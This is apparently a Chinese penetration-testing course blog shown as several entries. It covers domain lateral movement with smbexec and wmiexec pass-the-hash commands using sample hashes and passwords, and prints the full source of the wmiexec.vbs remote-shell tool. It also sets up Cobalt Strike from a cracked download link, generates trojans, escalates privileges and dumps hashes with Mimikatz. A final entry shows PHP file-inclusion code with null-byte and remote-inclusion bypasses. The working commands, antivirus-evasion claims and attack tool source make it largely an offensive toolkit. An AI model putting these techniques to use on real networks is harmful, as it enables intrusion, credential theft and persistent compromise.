<h2><span id="impacketsmbexec">impacket——smbexec</span></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">smbexec 无需先 ipc 链接 明文或 hash 传递<br>smbexec.exe 用户名:密码@目标IP<br>smbexec god/administrator:Admin12345@192.168.3.21<br>smbexec ./administrator:admin!@#45@192.168.3.32<br>smbexec -hashes :$HASH$ ./admin@192.168.3.21<br>smbbexec -hashes :$HASH$ domain/admin@192.168.3.21<br>smbexec -hashes :209c6174da490caeb422f3Fa5a7ae634 ./administrator@192.168.0.2<br>smbexec -hashes :ccef208c6485269c20db2cad21734fe7god/administrator@192.168.3.2<br></code></pre></td></tr></table></figure>



<p>明文：</p>
<p><img src="/../../images/xdnwaq/1640021078414.png" alt="1640021078414"></p>
<p>HASH：<br><img src="F:/%25E6%25A1%258C%25E9%259D%25A2%25E5%259B%25BE%25E6%25A0%2587/%25E7%25AC%2594%25E8%25AE%25B0/%25E5%2586%2585%25E7%25BD%2591%25E5%25AE%2589%25E5%2585%25A8/%25E5%2586%2585%25E7%25BD%2591%25E5%25AE%2589%25E5%2585%25A8-%25E5%259F%259F%25E6%25A8%25AA%25E5%2590%2591%2520smb&wmi%2520%25E6%2598%258E%25E6%2596%2587%25E6%2588%2596%2520hash%2520%25E4%25BC%25A0%25E9%2580%2592.assets/1640021650260.png" alt="1640021650260"></p>
<h1><span id="四域横向移动-wmi-服务利用-cscriptwmiexecwmic">四,域横向移动 WMI 服务利用-cscript,wmiexec,wmic</span></h1><blockquote>
<p>WMI(Windows Management Instrumentation) 是通过 135 端口进行利用，支持用户名明文或者 hash的方式进行认证，并且该方法不会在目标日志系统留下痕迹。</p>
</blockquote>
<h2><span id="wmiexec">wmiexec</span></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">wmic /node:192.168.0.2 /user:administrator /password:admin process call create &quot;cmd.exe /c ipconfig &gt;C:\1.txt&quot;<br><br>调用cmd.exe 执行ipconfig到靶机C盘的1.txt中<br></code></pre></td></tr></table></figure>

<p><img src="/../../images/xdnwaq/1640022207860.png" alt="1640022207860"></p>
<p>自带 cscript 明文传递 有回显<strong>（可过火绒）</strong><br> cscript &#x2F;&#x2F;nologo wmiexec.vbs &#x2F;shell 192.168.0.2 administrator admin </p>
<p><img src="/../../images/xdnwaq/1640022554523.png" alt="1640022554523"></p>
<h2><span id="impacket-wmiexec">impacket wmiexec</span></h2><p>套件 impacket wmiexec 明文或 hash 传递 有回显 exe 版本</p>
<p>wmiexec .&#x2F;administrator:<a href="mailto:&#97;&#100;&#109;&#105;&#110;&#x40;&#x31;&#57;&#x32;&#x2e;&#49;&#54;&#56;&#x2e;&#48;&#x2e;&#50;">&#97;&#100;&#109;&#105;&#110;&#x40;&#x31;&#57;&#x32;&#x2e;&#49;&#54;&#56;&#x2e;&#48;&#x2e;&#50;</a> “whoami”</p>
<p><img src="/../../images/xdnwaq/1640022650943.png" alt="1640022650943"></p>
<h2><span id="wmiexec-vbs源码">wmiexec VBS源码：</span></h2><p> <a href="https://x1aojun.lanzoub.com/i2exe046vrji">https://x1aojun.lanzoub.com/i2exe046vrji</a> </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">On Error Resume Next<br>&#x27;################################ Temp Result File , Change it to where you like<br>Const Path = &quot;C:\&quot;<br>Const FileName = &quot;wmi.dll&quot; <br>Const timeOut = 1200<br>&#x27;################################<br>file = Path &amp; &quot;\&quot; &amp; FileName<br>file = Replace(file,&quot;\\&quot;,&quot;\&quot;)<br>Set fso = CreateObject(&quot;Scripting.FileSystemObject&quot;)<br>FilePath = fso.GetParentFolderName(file) &#x27;for wmi create share<br>&#x27;WScript.Echo FilePath<br><br>WAITTIME = timeOut              &#x27;ms  time to execute command ,read result file after 1200ms<br><br>Set objArgs = WScript.Arguments<br>intArgCount = objArgs.Count <br>If intArgCount &lt; 2 Or intArgCount &gt; 5 Then<br>	WScript.Echo <br>	WScript.Echo &quot;   $$\      $$\ $$\      $$\ $$$$$$\ $$$$$$$$\ $$\   $$\ $$$$$$$$\  $$$$$$\  &quot;<br>	WScript.Echo &quot;   $$ | $\  $$ |$$$\    $$$ |\_$$  _|$$  _____|$$ |  $$ |$$  _____|$$  __$$\ &quot;<br>	WScript.Echo &quot;   $$ |$$$\ $$ |$$$$\  $$$$ |  $$ |  $$ |      \$$\ $$  |$$ |      $$ /  \__|&quot;<br>	WScript.Echo &quot;   $$ $$ $$\$$ |$$\$$\$$ $$ |  $$ |  $$$$$\     \$$$$  / $$$$$\    $$ |      &quot;<br>	WScript.Echo &quot;   $$$$  _$$$$ |$$ \$$$  $$ |  $$ |  $$  __|    $$  $$&lt;  $$  __|   $$ |      &quot;<br>	WScript.Echo &quot;   $$$  / \$$$ |$$ |\$  /$$ |  $$ |  $$ |      $$  /\$$\ $$ |      $$ |  $$\ &quot;<br>	WScript.Echo &quot;   $$  /   \$$ |$$ | \_/ $$ |$$$$$$\ $$$$$$$$\ $$ /  $$ |$$$$$$$$\ \$$$$$$  |&quot;<br>	WScript.Echo &quot;   \__/     \__|\__|     \__|\______|\________|\__|  \__|\________| \______/ &quot;<br>	WScript.Echo &quot;                                               v1.1dev        By. Twi1ight   &quot;<br>	WScript.Echo &quot; Usage:&quot; &amp; _<br>					vbTab &amp; &quot;wmiexec.vbs  /shell  host&quot; &amp; _<br>		vbNewLine &amp; vbTab &amp; &quot;wmiexec.vbs  /shell  host  user  pass&quot; &amp; _<br>		vbNewLine &amp; vbTab &amp; &quot;wmiexec.vbs  /cmd  host  command&quot; &amp; _<br>		vbNewLine &amp; vbTab &amp; &quot;wmiexec.vbs  /cmd  host  user  pass  command&quot; &amp; vbNewLine &amp; _<br>		vbNewLine &amp; vbTab &amp; &quot;  /shell&quot;  &amp; vbTab &amp; &quot;half-interactive shell mode&quot; &amp; _<br>		vbNewLine &amp; vbTab &amp; &quot;  /cmd&quot; &amp; vbTab &amp; vbTab &amp; &quot;single command mode&quot; &amp; _<br>		vbNewLine &amp; vbTab &amp; &quot;  host&quot; &amp; vbTab &amp; vbTab &amp; &quot;hostname or IP address&quot; &amp; _<br>		vbNewLine &amp; vbTab &amp; &quot;  command&quot; &amp; vbTab &amp; &quot;the command to execute on remote host&quot; &amp; _<br>		vbNewLine &amp; vbNewLine &amp; vbTab &amp; &quot;  -waitTIME&quot; &amp; vbTab &amp; _<br>		 &quot;[both mode] ,delay TIME to read result,&quot;&amp; vbNewLine &amp; vbTab &amp; _<br>		 vbTab &amp; vbTab &amp;&quot;eg. &#x27;systeminfo -wait5000&#x27; &#x27;ping google.com -wait2000&#x27;&quot; &amp; _<br>		vbNewLine &amp; vbTab &amp; &quot;  -persist&quot; &amp; vbTab &amp; _<br>		 &quot;[both mode] ,running command background and persistent&quot; &amp; vbNewLine &amp; vbTab &amp; _<br>		 vbTab &amp; vbTab &amp;&quot;such as nc.exe or Trojan&quot; <br>	WScript.Quit()<br>End If<br><br>If LCase(objArgs.Item(0)) &lt;&gt; &quot;/cmd&quot; And LCase(objArgs.Item(0)) &lt;&gt; &quot;/shell&quot; Then <br>	WScript.Echo &quot;WMIEXEC ERROR: Wrong Mode Specified!&quot;<br>	WScript.Quit<br>End If<br>boolShellMode = True<br>If LCase(objArgs.Item(0)) = &quot;/cmd&quot; Then boolShellMode = False<br>If boolShellMode = False Then command = objArgs.Item(intArgCount - 1)<br><br>host = objArgs.Item(1)<br>If intArgCount &gt; 3 Then <br>	user = objArgs.Item(2)<br>	pass = objArgs.Item(3)<br>	Set objShell = CreateObject(&quot;WScript.Shell&quot;)<br>	strNetUse = &quot;cmd.exe /c net use \\&quot; &amp; host &amp; &quot; &quot;&quot;&quot; &amp; pass &amp; &quot;&quot;&quot; &quot; &amp; &quot;/user:&quot; &amp; user<br>	&#x27;WScript.Echo strNetUse<br>	objShell.Run strNetUse,0<br>End If<br>&#x27;Output Status<br>WScript.Echo &quot;WMIEXEC : Target -&gt; &quot; &amp; host<br>WScript.Echo &quot;WMIEXEC : Connecting...&quot;<br><br>Set objLocator = CreateObject(&quot;wbemscripting.swbemlocator&quot;)<br>If intArgCount &gt;2 Then<br>	set objWMIService = objLocator.connectserver(host,&quot;root/cimv2&quot;,user,pass)<br>Else<br>	Set objWMIService = objLocator.ConnectServer(host,&quot;root/cimv2&quot;)<br>End If<br>If Err.Number &lt;&gt; 0 Then<br>	WScript.Echo &quot;WMIEXEC ERROR: &quot; &amp; Err.Description <br>	WScript.Quit<br>End If<br>WScript.Echo &quot;WMIEXEC : Login -&gt; OK&quot;<br>WScript.Echo &quot;WMIEXEC : Result File -&gt; &quot; &amp; file<br><br>boolPersist = False<br>&#x27;Create Share<br>CreateShare()<br>CurrentFolder = Null<br>&#x27;-----single Command mode------<br>If boolShellMode = False Then<br>	WAITTIME = 5000<br>	WScript.Echo vbNewLine &amp; vbTab &amp; host &amp; &quot;  &gt;&gt;  &quot; &amp; command<br>	boolGetFolder = False<br>	strResult = PhraseCmd( command )<br>	&#x27;WScript.Echo strResult<br>	If strResult = &quot;persist&quot; Then<br>		boolPersist = True<br>		Exec command,&quot;nul&quot;<br>	Else<br>		Exec command, file<br>		ReadResult()<br>	End If<br>	If intArgCount &gt; 3 Then <br>		Set objShell = CreateObject(&quot;WScript.Shell&quot;)<br>		strNetUse = &quot;cmd.exe /c net use \\&quot; &amp; host &amp; &quot; /del&quot;<br>		objShell.Run strNetUse,0<br>	End If<br>	DeleteShare()<br>	WScript.Quit<br>End If<br>&#x27;------------------------------<br><br>&#x27;++++++++shell mode++++++++++++<br>&#x27;get current working directory<br>boolGetFolder = True<br>CurrentFolder = Exec(&quot;cd&quot;, file)<br><br>&#x27;WScript.Echo CurrentFolder<br>Do While True<br>	boolPersist = False<br>	WAITTIME = timeOut<br>	wscript.stdout.write(CurrentFolder &amp; &quot;&gt;&quot;)<br>	command = wscript.stdin.ReadLine<br>	&#x27;press &#x27;Enter&#x27; directorly<br>	Do While command = &quot;&quot;<br>		wscript.stdout.write(CurrentFolder &amp; &quot;&gt;&quot;)<br>		command = wscript.stdin.ReadLine<br>	Loop<br>	If LCase(Trim(command)) = &quot;exit&quot; Then Exit Do<br>	&#x27;If Not IsEmpty(command) Then <br>	&#x27;process &#x27;cd&#x27; command--------&gt;&gt;&gt;&gt;<br>	strResult = PhraseCmd( command )<br>	If strResult = &quot;cd&quot; Then <br>		command = command &amp; &quot; &amp; cd &quot;<br>		boolGetFolder = True<br>		DestFolder = Exec(command, file)<br>		If CurrentFolder = DestFolder Then <br>			WScript.Echo &quot;The system cannot find the path specified.&quot;<br>		Else<br>			CurrentFolder = DestFolder<br>		End If<br>	ElseIf strResult = &quot;persist&quot; Then<br>		boolPersist = True<br>		&#x27;WScript.Echo &quot;persist&quot;<br>		Exec command,&quot;nul&quot;<br>		&#x27;##########################################toDo<br>	&#x27;-----------&lt;&lt;&lt;&lt;<br>	Else<br>		On Error Resume Next<br>		err.clear<br>		Exec command, file<br>		ReadResult()<br>	    If err.number &lt;&gt; 0 Then wscript.echo( &quot;WMIEXEC ERROR: &quot; &amp; Err.Number &amp; &quot; &quot; &amp; err.description)<br>		Err.Clear<br>	    On Error Goto 0<br>	End If<br>loop<br><br>strDelFile = &quot;del &quot; &amp; file &amp; &quot; /F&quot;<br>Exec strDelFile,&quot;nul&quot;<br>If intArgCount &gt; 3 Then <br>	Set objShell = CreateObject(&quot;WScript.Shell&quot;)<br>	strNetUse = &quot;cmd.exe /c net use \\&quot; &amp; host &amp; &quot; /del&quot;<br>	objShell.Run strNetUse,0<br>End If<br>DeleteShare()<br><br>&#x27;#####################################<br>Function PhraseCmd(cmd)<br>	PhraseCmd = False &#x27; not &#x27;cd&#x27;<br>	arrCommand = Split(cmd)<br>	strExe = arrCommand(0)<br>	If LCase(Trim(strExe)) = &quot;cd&quot; Or LCase(Trim(strExe)) = &quot;cd.exe&quot; Then PhraseCmd = &quot;cd&quot;  &#x27; is &#x27;cd&#x27;<br>	Set regEx = New RegExp<br>	regEx.Pattern = &quot;^[a-z]:$&quot;<br>	regEx.IgnoreCase = True<br>	Set Matches = regEx.Execute(cmd)<br>	If Matches.Count &lt;&gt; 0 Then PhraseCmd = &quot;cd&quot; &#x27; is &#x27;d:&#x27;<br>	&#x27;phrase time command<br>	regEx.Pattern = &quot;(.*?)-wait(\d+)&quot;<br>	regEx.IgnoreCase = True<br>	Set Matches = regEx.Execute(cmd)<br>	If Matches.Count &lt;&gt; 0 Then <br>		Set objMatch = Matches(0)<br>		command = objMatch.SubMatches(0)<br>		&#x27;WScript.Echo &quot;Command :&quot; &amp; command<br>		WAITTIME = CInt(objMatch.SubMatches(1))<br>		WScript.Echo &quot;WMIEXEC : Waiting &quot; &amp; WAITTIME &amp; &quot; ms...&quot; &amp; vbNewLine<br>	End If<br>	&#x27;phrase persist command<br>	regEx.Pattern = &quot;(.*?)-persist&quot;<br>	regEx.IgnoreCase = True<br>	Set Matches = regEx.Execute(cmd)<br>	If Matches.Count &lt;&gt; 0 Then <br>		Set objMatch = Matches(0)<br>		command = objMatch.SubMatches(0)<br>		PhraseCmd = &quot;persist&quot;  &#x27; is quiet<br>	End If<br>End Function<br><br>Function CreateShare()<br>	&#x27;create share<br>	Set objNewShare = objWMIService.Get(&quot;Win32_Share&quot;)<br>	intReturn = objNewShare.Create _<br>	    (FilePath, &quot;WMI_SHARE&quot;, 0, 25, &quot;&quot;)<br>	If intReturn &lt;&gt; 0 Then<br>		WScript.Echo &quot;WMIEXEC ERROR: Share could not be created.&quot; &amp; _<br>	        vbNewLine &amp; &quot;WMIEXEC ERROR: Return value -&gt; &quot; &amp; intReturn<br>	    Select Case intReturn<br>	    	Case 2<br>	    		WScript.Echo &quot;WMIEXEC ERROR: Access Denied!&quot;<br>	    	Case 9<br>	    		WScript.Echo &quot;WMIEXEC ERROR: Invalid File Path!&quot;<br>	    	Case 22<br>	    		WScript.Echo &quot;WMIEXEC ERROR: Share Name Already In Used!&quot;<br>	    	Case 24<br>	    		WScript.Echo &quot;WMIEXEC ERROR: Directory NOT exists!&quot;<br>	    End Select<br>		If intReturn &lt;&gt; 22 Then WScript.Quit<br>	Else<br>	    WScript.Echo &quot;WMIEXEC : Share created sucess.&quot;<br>		WScript.Echo &quot;WMIEXEC : Share Name -&gt; WMI_SHARE&quot;<br>		WScript.Echo &quot;WMIEXEC : Share Path -&gt; &quot; &amp; FilePath<br>	End If<br>End Function<br><br>Function DeleteShare()<br>	Set colShares = objWMIService.ExecQuery _<br>		(&quot;Select * from Win32_Share Where Name = &#x27;WMI_SHARE&#x27;&quot;)<br>	For Each objShare In colShares<br>		intReturn = objShare.Delete<br>	Next<br>	If intReturn &lt;&gt; 0 Then<br>		WScript.Echo &quot;WMIEXEC ERROR: Delete Share failed.&quot; &amp; _<br>	        vbNewLine &amp; &quot;WMIEXEC ERROR: Return value -&gt; &quot; &amp; intReturn<br>	    Select Case intReturn<br>	    	Case 2<br>	    		WScript.Echo &quot;WMIEXEC ERROR: Access Denied!&quot;<br>	    	Case 25<br>	    		WScript.Echo &quot;WMIEXEC ERROR: Share Not Exists!&quot;<br>	    End Select<br>	Else<br>	    WScript.Echo &quot;WMIEXEC : Share deleted sucess.&quot;<br>	End If<br>End Function<br><br>Function Exec(cmd, file)<br>	Set objStartup = objWMIService.Get(&quot;Win32_ProcessStartup&quot;)<br>	Set objConfig = objStartup.SpawnInstance_<br>	objConfig.ShowWindow = 12<br>	<br>	Set objProcess=objWMIService.get(&quot;Win32_Process&quot;)<br>	strExec = &quot;cmd.exe /c &quot; &amp; cmd &amp; &quot; &gt; &quot; &amp; file &amp; &quot; 2&gt;&amp;1&quot;  &#x27;2&gt;&amp;1 err<br>	If boolPersist Then<br>		strExec = cmd<br>		intPath = InStr(cmd,&quot;\&quot;)<br>		If intPath = 0 Then strExec = CurrentFolder &amp; &quot;\&quot; &amp; strExec<br>	End If<br>	&#x27;WScript.Echo strExec<br>	intReturn = objProcess.Create _<br>	    (strExec, CurrentFolder, objConfig, intProcessID)  &#x27;Add CurrentFolder (strExec, Null, objConfig, intProcessID)<br>	If intReturn &lt;&gt; 0 Then<br>		WScript.Echo &quot;WMIEXEC ERROR: Process could not be created.&quot; &amp; _<br>	        vbNewLine &amp; &quot;WMIEXEC ERROR: Command -&gt; &quot; &amp; cmd &amp; _<br>	        vbNewLine &amp; &quot;WMIEXEC ERROR: Return value -&gt; &quot; &amp; intReturn<br>	    Select Case intReturn<br>	    	Case 2<br>	    		WScript.Echo &quot;WMIEXEC ERROR: Access Denied!&quot;<br>			Case 3<br>				WScript.Echo &quot;WMIEXEC ERROR: Insufficient Privilege!&quot;<br>	    	Case 9<br>	    		WScript.Echo &quot;WMIEXEC ERROR: Path Not Found!&quot;<br>	    End Select<br>	Else<br>&#x27;	    WScript.Echo &quot;Process created.&quot; &amp; _<br>&#x27;	        vbNewLine &amp; &quot;Command: &quot; &amp; cmd &amp; _<br>&#x27;	        vbNewLine &amp; &quot;Process ID: &quot; &amp; intProcessID<br>		If boolPersist Then WScript.Echo &quot;WMIEXEC : Process created. PID: &quot;&amp; intProcessID<br>	    If boolGetFolder = True Then <br>	    	boolGetFolder = False<br>	    	Exec = GetCurrentFolder()<br>	    	Exit Function<br>	    End If<br>	    &#x27;ReadResult()<br>	End If<br>End Function<br><br>Function ReadResult()<br>	WScript.Sleep(WAITTIME)<br>	UNCFilePath = &quot;\\&quot; &amp; host &amp; &quot;\&quot; &amp; &quot;WMI_SHARE&quot; &amp; &quot;\&quot; &amp; FileName<br>	Set fso = CreateObject(&quot;Scripting.FileSystemObject&quot;)<br>	Set objFile = fso.OpenTextFile(UNCFilePath, 1)<br>	If Not objFile.AtEndOfStream Then strContents = objFile.ReadAll<br>	objFile.Close<br>	WScript.Echo strContents<br>	&#x27;fso.DeleteFile(UNCFilePath)   win2008 fso has no privilege to delete file on share folder<br>	strDelFile = &quot;del &quot; &amp; file &amp; &quot; /F&quot;<br>	Exec strDelFile,&quot;nul&quot;<br>End Function<br><br>Function GetCurrentFolder()<br>	WScript.Sleep(WAITTIME)<br>	UNCFilePath = &quot;\\&quot; &amp; host &amp; &quot;\&quot; &amp; &quot;WMI_SHARE&quot; &amp; &quot;\&quot; &amp; FileName<br>	Set fso = CreateObject(&quot;Scripting.FileSystemObject&quot;)<br>	Set objFile = fso.OpenTextFile(UNCFilePath, 1)<br>	GetCurrentFolder = objFile.ReadLine<br>	objFile.Close<br>	strDelFile = &quot;del &quot; &amp; file &amp; &quot; /F&quot;<br>	Exec strDelFile,&quot;nul&quot;<br>End Function<br></code></pre></td></tr></table></figure>





]]></content>
      <categories>
        <category>小迪安全</category>
      </categories>
  </entry>
  <entry>
    <title>小迪安全系列-[内网渗透进阶]</title>
    <url>/2022/05/04/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97-%5B%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E8%BF%9B%E9%98%B6%5D/</url>
    <content><![CDATA[<p>[TOC]</p>
<h1><span id="一域横向-cobaltstrikeampspnamprdp">一,域横向 CobaltStrike&amp;SPN&amp;RDP</span></h1><h2><span id="域横向移动测试流程一把梭-cs初体验">域横向移动测试流程一把梭-CS初体验</span></h2><p> 下载：<a href="https://zhiji.lanzoui.com/iYOvjp5hqra">CobaltStrike4.0</a> 密码：cs66 </p>
<blockquote>
<p><strong>客户端：win10（自己的主机）</strong></p>
<p><strong>服务端： Kali</strong></p>
</blockquote>
<p>安装java环境<br>客户端windows的java环境配置可以看我前面的文章，这里就不再赘述，下面介绍服务端的配置</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">进入根目录</span><br>cd /<br><span class="hljs-meta prompt_">#</span><span class="language-bash">查看java是否安装</span><br>java -version<br><span class="hljs-meta prompt_">#</span><span class="language-bash">安装java</span><br>apt install openjdk-14-jre-headless<br><br></code></pre></td></tr></table></figure>



<p> 检查是否安装成功,返回面的内容，说明已经成功了 </p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">root@vultr:/# java -version<br>openjdk version &quot;14.0.2&quot; 2020-07-14<br>OpenJDK Runtime Environment (build 14.0.2+12-Ubuntu-120.04)<br>OpenJDK 64-Bit Server VM (build 14.0.2+12-Ubuntu-120.04, mixed mode, sharing)<br></code></pre></td></tr></table></figure>



<p> 环境变量 </p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">查看java的安装路径，这里提示我们在链接组java（提供/usr/bin/java）中只有一种选择，所以无需配置环境变量</span><br>root@vultr:/# update-alternatives --config java<br>There is only one alternative in link group java (providing /usr/bin/java): /usr/lib/jvm/java-14-openjdk-amd64/bin/java<br>Nothing to configure.<br><br></code></pre></td></tr></table></figure>





<h2><span id="启动服务端">启动服务端</span></h2><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">给权限</span><br>chmod 777 ./teamserver<br><span class="hljs-meta prompt_">#</span><span class="language-bash">启动服务端</span><br>./teamserver vps的ip 连接密码<br></code></pre></td></tr></table></figure>

<p><img src="/../../images/xdnwaq/1651669739393.png" alt="1651669739393"></p>
<h2><span id="客户端连接">客户端连接</span></h2><p>这里只需要将host修改为服务器端的ip地址，端口50050固定不（端口确保开启），用户名可以随便起，密码必须写服务器端的密码。</p>
<p><strong>连接成功，服务端搭建完毕</strong></p>
<p><img src="/../../images/xdnwaq/1640500886850.png" alt="1640500886850"></p>
<h1><span id="cobaltstrike利用">CobaltStrike利用</span></h1><h3><span id="翻译">翻译</span></h3><p><img src="/../../images/xdnwaq/1651757827302.png" alt="1651757827302"></p>
<p><img src="/../../images/xdnwaq/1651757843156.png" alt="1651757843156"></p>
<h2><span id="主机上线">主机上线</span></h2><h3><span id="配置监听器">配置监听器</span></h3><p><img src="/../../images/xdnwaq/165168350233655.png" alt="1651683502336"></p>
<p><img src="/../../images/xdnwaq/164050146705546.png" alt="1640501467046"></p>
<p><img src="/../../images/xdnwaq/1651684006980.png" alt="1651684006980"></p>
<h3><span id="配置后门木马">配置后门木马</span></h3><p><img src="/../../images/xdnwaq/1651683848651.png" alt="1651683848651"></p>
<h3><span id="生成木马">生成木马</span></h3><p><img src="/../../images/xdnwaq/1651684126849.png" alt="1651684126849"></p>
<h3><span id="主机上线成功">主机上线成功</span></h3><p><strong><img src="/../../images/xdnwaq/1651684932069.png" alt="1651684932069"></strong></p>
<h2><span id="提权">提权</span></h2><h3><span id="提权插件">提权插件</span></h3><p>上传插件后，单机UnIoad</p>
<p><img src="/../../images/xdnwaq/1651706907877.png" alt="1651706907877"></p>
<h3><span id="提权配置">提权配置</span></h3><p><img src="/../../images/xdnwaq/16517072374002.png" alt="1651707237002"></p>
<h3><span id="提权成功">提权成功</span></h3><p><img src="/../../images/xdnwaq/1651707405682.png" alt="1651707405682"></p>
<h2><span id="信息收集命令">信息收集命令</span></h2><h3><span id="getuid查看系统权限">getuid查看系统权限</span></h3><p><img src="/../../images/xdnwaq/1651707774341.png" alt="1651707774341"></p>
<h2><span id="net-view查看网络拓扑">net view查看网络拓扑</span></h2><p><img src="/../../images/xdnwaq/1651707917280.png" alt="1651707917280"></p>
<p>当我们信息收集太多时，会显得很杂乱，通过Targets菜单获取所有探针过的主机</p>
<p><img src="/../../images/xdnwaq/1651708048992.png" alt="1651708048992"></p>
<h3><span id="执行minikatz">执行MInikatz</span></h3><p><img src="/../../images/xdnwaq/1651756948323.png" alt="1651756948323"></p>
<h3><span id="转存hash">转存Hash</span></h3><p><img src="/../../images/xdnwaq/1651756812807.png" alt="1651756812807"></p>
<ul>
<li><h3><span id="执行cmd命令">执行CMD命令</span></h3></li>
</ul>
<p>Cobalt Strike 默认提供自带命令</p>
<p><img src="/../../images/xdnwaq/1651757061320.png" alt="1651757061320"></p>
<p><img src="/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97-%5B%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E8%BF%9B%E9%98%B6%5D.assets/1651757100401.png" alt="1651757100401"></p>
<h3><span id="调用cmd">调用CMD</span></h3><p>如果要调用CMD命令的需要在输入框前面加一个**<code>shell</code>**</p>
<p><img src="/../../images/xdnwaq/1651757351430.png" alt="1651757351430"></p>
<h3><span id="文件管理">文件管理</span></h3><p><img src="/../../images/xdnwaq/1651757885221.png" alt="1651757885221"></p>
<h3><span id="提权">提权</span></h3><p> <a href="https://x1aojun.lanzoub.com/i8pau04c9iyd">提权插件下载</a> </p>
<p><img src="/../../images/xdnwaq/1651758026432.png" alt="1651758026432"></p>
<p><img src="/../../images/xdnwaq/1651757981862.png" alt="1651757981862"></p>
<p>多了很多插件</p>
<p><img src="/../../images/xdnwaq/1651758356708.png" alt="1651758356708"></p>
]]></content>
      <categories>
        <category>小迪安全</category>
      </categories>
  </entry>
  <entry>
    <title>小迪安全系列-[文件包含]</title>
    <url>/2022/05/29/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97-%5B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%5D/</url>
    <content><![CDATA[<h1><span id="文件操作之文件包含漏洞全解">文件操作之文件包含漏洞全解</span></h1><p>sdfsdfsd文件操作</p>
<p><img src="/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97-%5B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%5D.assets/1653812489312.png" alt="1653812489312"></p>
<p>文件包含：把文件当作脚本来执行</p>
<p>包含漏洞：将指定文件以脚本代码执行     条件：【可控变量】【include函数】</p>
<p>原理：将一些配置文件写入到一个文件中，使用的时候直接引用</p>
<p><img src="/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97-%5B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%5D.assets/1653812881806.png" alt="1653812881806"></p>
<h1><span id="一-小实例无限制">一. 小实例【无限制】</span></h1><p><img src="/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97-%5B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%5D.assets/1653817077916.png" alt="1653817077916"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;?php<br>$filename=$_GET[&#x27;filename&#x27;];<br>include($filename);<br>?&gt;<br></code></pre></td></tr></table></figure>

<p><img src="/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97-%5B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%5D.assets/1653817285603.png" alt="1653817285603"></p>
<h1><span id="二小实例有限制">二.小实例【有限制】</span></h1><p><img src="/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97-%5B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%5D.assets/1653819150456.png" alt="1653819150456"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;?php<br>$filename=$_GET[&#x27;filename&#x27;];<br>include($filename.&quot;.html&quot;);<br>?&gt;<br></code></pre></td></tr></table></figure>



<p>绕过方法：</p>
<p><img src="/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97-%5B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%5D.assets/1653819277361.png" alt="1653819277361"></p>
<p>filename&#x3D;1.txt%00</p>
<p><img src="/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97-%5B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%5D.assets/1653819305919.png" alt="1653819305919"></p>
<p>长度截断：条件：Windows，点号需要长于256    Linux长于4096</p>
<p><img src="/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97-%5B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%5D.assets/1653819664767.png" alt="1653819664767"></p>
<p>检测：</p>
<p>白盒</p>
<p>黑盒</p>
<p>漏洞工具</p>
<p>公开漏洞</p>
<p>手工看参数值及功能点</p>
<p><img src="/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97-%5B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%5D.assets/1653817570533.png" alt="1653817570533"></p>
<p>类型</p>
<p>本地包含</p>
<p>本地包含是看服务器上有没有这个文件，例如包含D盘下的<a href="http://www.txt文件,如果没有就包含不了/">www.txt文件，如果没有就包含不了</a></p>
<p><img src="/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97-%5B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%5D.assets/1653817961953.png" alt="1653817961953"></p>
<p><img src="/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97-%5B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%5D.assets/1653818871639.png" alt="1653818871639"></p>
<p>远程包含</p>
<p>可以是由我们自己创建的一个网站或者地址，来让漏洞包含我们指向的文件</p>
<p>利用</p>
<p>利用各种伪协议来绕waf软件</p>
